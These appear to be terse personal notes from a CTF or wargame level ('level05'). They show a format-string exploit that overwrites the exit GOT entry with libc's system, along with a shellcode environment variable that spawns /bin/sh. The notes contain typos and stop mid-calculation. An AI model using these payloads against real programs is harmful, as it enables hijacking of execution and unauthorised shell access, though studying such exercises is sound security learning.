#

## Context

fgets secure

printf insecure

exit() ? overwrtei got section

## Ret2libc
 
find exit address, overwrite with system call, add exit address, add /bin/sh address

exit address

objdump -R ./level05 | grep exit
080497e0 R_386_JUMP_SLOT   exit

info functions system
0xf7e6aed0  system

info proc mappings
0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.

exit | system | "/bin/sh"
--- | --- | ---
0xf7e5eb70 | 0xf7e6aed0 | 0xf7f897ec

find the buffer place to overwrite exit func

./level05 
AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
aaaa64.f7fcfac0.0.0.0.0.ffffffff.ffffd674.f7fdb000.61616161.[...]

buffer is the 10th address on the stack

stack need to be:

stack |
--- |
exit (point to system)
random address (4 byte)
"/bin/sh"

Payload

exit address + 4byte random + /bin/sh + things to overwrite exit address

### First overwrite exit with system address
0x080497e0 exti
0xf7e6aed0 system

f7d6 = 63462
aed0 = 44752
63462 - 44752 = 18710

r < <(python2.7 -c 'import sys; sys.stdout.write(b"\xe0\x97\x04\x08" + b"\xe2\x97\x04\x08" + b"%44744x" + b"%10$hn" + b"%18710x" + b"%11$hn")')

x/a 0x080497e0
0x80497e0 <exit@got.plt>:	0xf7e6aed0

### Build final exploit

export SHELLCODE=$(python2.7 -c 'import sys; sys.stdout.write(b"\x90" * 0xffff + b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')

0xfffee2c0

fffe = 65534
e2c0 = 58048